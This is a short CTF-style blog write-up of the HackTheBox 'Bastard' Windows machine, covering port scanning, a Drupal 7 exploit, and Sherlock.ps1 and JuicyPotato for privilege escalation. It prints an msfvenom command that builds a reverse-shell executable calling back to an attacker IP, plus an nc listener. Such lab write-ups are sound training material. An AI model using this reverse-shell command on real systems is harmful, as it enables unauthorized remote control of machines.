---
title: "Bastard"
date: 2023-08-10T11:30:03+00:00
tags: ["Drupal v7","windows","sherlock.ps1"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/Bastard.png"
comments: false
description: "This is a friendly Windows machine that has a web page vulnerable due to Drupal v7."
---

## Room Information

- Room name: Bastard
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/Bastard

![Untitled](/HTB/Bastard.png)

## Tools Used

- Nmap
- searchsploit
- sherlock.ps1
- multiple exploits ...

## Port Scanning

Other room, other port scan.

![Untitled](/HTB/nmap-bastard.png)

I found 3 open ports, 135(msrpc), 80(web), 49154(msrpc). Let's focus on the website ...

## Enumeration

On the port scan I saw that there's a file called `robots.txt` and The first thing I searched was just this
and for surprise this file content's some routes that I can put in a file and scan with `wfuzz or gobuster`,
but this results didn't tell me anything relevant. Since I saw a Drupal version 7 and I search it on searchsploit ...

![Untitled](/HTB/drupal-bastard.png)

Then I googled it and find a exploit in python that seems to work ...

![Untitled](/HTB/remote-bastard.png)


## Exploiting

Now I had remote control of the machine as user guest. So next I did was create a reverse shell with `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 -f exe > reverse.exe` and listening with `nc -nlvp 443`, next the the machine was pawned ...

![Untitled](/HTB/in-bastard.png)

## Escalating Privileges

We are in now inside, with a user guest.

Next as always in a windows machine I did a `systeminfo` and searched with windows-vuln-suggester and Sherlock.ps1 the posibles vulnerabilities and found one called JuicyPotato ...

The full ecalating is [here](https://brsalcedom.github.io/Bastard-Writeup-HackTheBox/) better.

## Lessons Learned

- What insights did you gain from the room?
    
    I learned more about Durpal and windows.
    
- Were there any novel tools or techniques employed?
    
    The use of Sherlock.ps1.
